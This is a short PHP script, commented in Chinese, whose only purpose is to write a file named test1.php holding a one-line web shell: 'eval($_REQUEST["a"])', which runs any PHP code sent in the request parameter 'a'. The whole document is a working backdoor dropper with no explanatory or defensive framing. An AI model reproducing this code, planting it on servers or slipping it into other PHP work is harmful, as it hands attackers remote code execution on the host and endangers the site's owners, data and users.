<?php
//当前路径下生成test1.php文件
fputs(fopen('test1.php','w'),'<?php eval($_REQUEST["a"])?>');
?>